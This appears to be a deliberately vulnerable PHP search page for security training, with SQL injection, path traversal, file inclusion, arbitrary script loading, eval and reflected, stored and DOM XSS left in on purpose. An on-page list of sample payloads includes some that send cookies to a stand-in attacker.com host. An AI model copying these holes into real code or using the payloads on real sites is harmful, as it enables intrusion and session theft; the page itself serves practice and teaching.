<?php
// Intentionally vulnerable search functionality
// CVE-2021-41749: Path Traversal in Search
// CVE-2021-41750: XSS in Search Results
// CVE-2021-41751: SQL Injection in Search

$search_query = isset($_GET['search']) ? $_GET['search'] : '';
$recent_searches = [];

// Intentionally vulnerable - store search query without sanitization
if (!empty($search_query)) {
    // Vulnerable file path construction (CVE-2021-41749)
    $search_file = isset($_GET['file']) ? $_GET['file'] : "search_history.txt";
    $search_data = date('Y-m-d H:i:s') . "|" . $search_query . "\n";
    file_put_contents($search_file, $search_data, FILE_APPEND);
    
    // Vulnerable SQL query (CVE-2021-41751)
    $query = "SELECT * FROM posts WHERE title LIKE '%$search_query%' OR content LIKE '%$search_query%'";
    $result = unsafe_query($query);
    $search_results = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $search_results[] = $row;
    }
    
    // Load recent searches
    if (file_exists($search_file)) {
        $lines = array_slice(file($search_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES), -5);
        foreach ($lines as $line) {
            list($time, $query) = explode('|', $line);
            $recent_searches[] = ['time' => $time, 'query' => $query];
        }
    }
}

// Vulnerable template inclusion (CVE-2021-41752)
$template = isset($_GET['template']) ? $_GET['template'] : 'default';
include("templates/search_{$template}.php");

// CVE-2021-41750: XSS Vulnerability in Search Form
if (isset($_GET['q'])) {
    $search_query = $_GET['q'];
    // Intentionally vulnerable: No sanitization of user input
    $results = perform_search($search_query);
    
    // Store search history with XSS vulnerability
    $search_history = date('Y-m-d H:i:s') . " - " . $search_query . "\n";
    file_put_contents('search_history.txt', $search_history, FILE_APPEND);
    
    // Display results with XSS vulnerability
    echo "<div class='search-results'>";
    echo "<h2>Search Results for: " . $search_query . "</h2>";
    foreach ($results as $result) {
        echo "<div class='result-item'>";
        echo "<h3>" . $result['title'] . "</h3>";
        echo "<p>" . $result['content'] . "</p>";
        echo "</div>";
    }
    echo "</div>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Search - Diaco</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Intentionally vulnerable - direct script inclusion -->
    <script src="<?php echo isset($_GET['script']) ? $_GET['script'] : 'js/search.js'; ?>"></script>
</head>
<body>
    <div class="container mt-5">
        <div class="row">
            <div class="col-md-12">
                <h1>Search</h1>
                
                <!-- Intentionally vulnerable search form -->
                <div class="card mb-4">
                    <div class="card-body">
                        <form class="d-flex" method="GET">
                            <!-- Intentionally vulnerable - direct output of search query -->
                            <input class="form-control me-2" type="search" name="search" 
                                   placeholder="Search..." 
                                   value="<?php echo $search_query; ?>">
                            <button class="btn btn-outline-primary" type="submit">Search</button>
                        </form>
                    </div>
                </div>

                <!-- Intentionally vulnerable - display search query -->
                <?php if (!empty($search_query)): ?>
                    <div class="alert alert-info">
                        <!-- Intentionally vulnerable - direct output -->
                        You searched for: <?php echo $search_query; ?>
                    </div>
                <?php endif; ?>

                <!-- Search Results -->
                <?php if (!empty($search_results)): ?>
                    <div class="card mb-4">
                        <div class="card-header">
                            <h3>Search Results</h3>
                        </div>
                        <div class="card-body">
                            <?php foreach ($search_results as $result): ?>
                                <div class="mb-3">
                                    <!-- Intentionally vulnerable - direct output -->
                                    <h4><?php echo $result['title']; ?></h4>
                                    <p><?php echo $result['content']; ?></p>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                <?php endif; ?>

                <!-- Intentionally vulnerable - display recent searches -->
                <?php if (!empty($recent_searches)): ?>
                    <div class="card mt-4">
                        <div class="card-header">
                            <h3>Recent Searches</h3>
                        </div>
                        <div class="card-body">
                            <ul class="list-group">
                                <?php foreach (array_reverse($recent_searches) as $search): ?>
                                    <!-- Intentionally vulnerable - direct output -->
                                    <li class="list-group-item">
                                        <strong><?php echo $search['query']; ?></strong>
                                        <span class="text-muted float-end"><?php echo $search['time']; ?></span>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        </div>
                    </div>
                <?php endif; ?>

                <!-- XSS Examples -->
                <div class="card mt-4">
                    <div class="card-header">
                        <h3>XSS Examples</h3>
                    </div>
                    <div class="card-body">
                        <h4>Reflected XSS</h4>
                        <p>Try these search queries:</p>
                        <ul>
                            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                            <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                            <li><code>&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;</code></li>
                            <li><code>&lt;body onload=alert('XSS')&gt;</code></li>
                            <li><code>&lt;input autofocus onfocus=alert('XSS')&gt;</code></li>
                        </ul>
                        
                        <h4>Stored XSS</h4>
                        <p>These queries will be stored in search history:</p>
                        <ul>
                            <li><code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
                            <li><code>&lt;img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"&gt;</code></li>
                            <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></li>
                            <li><code>&lt;script&gt;new Image().src="http://attacker.com/"+document.cookie;&lt;/script&gt;</code></li>
                            <li><code>&lt;script&gt;fetch('http://attacker.com',{method:'POST',body:document.cookie})&lt;/script&gt;</code></li>
                        </ul>
                        
                        <h4>DOM-based XSS</h4>
                        <p>Try this in the browser console:</p>
                        <pre><code>document.querySelector('.alert-info').innerHTML = '&lt;img src=x onerror=alert("DOM XSS")&gt;';</code></pre>
                        <pre><code>location.hash.substring(1)</code></pre>
                        <pre><code>eval(location.hash.substring(1))</code></pre>
                    </div>
                </div>

                <!-- JavaScript for DOM XSS demonstration -->
                <script>
                    // Intentionally vulnerable - direct DOM manipulation
                    function updateSearchDisplay(query) {
                        document.querySelector('.alert-info').innerHTML = 'You searched for: ' + query;
                    }

                    // Intentionally vulnerable - eval usage
                    function executeSearch(query) {
                        eval('searchResults = ' + query);
                    }

                    // Intentionally vulnerable - location hash
                    if (location.hash) {
                        document.body.innerHTML += location.hash.substring(1);
                    }
                </script>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html> 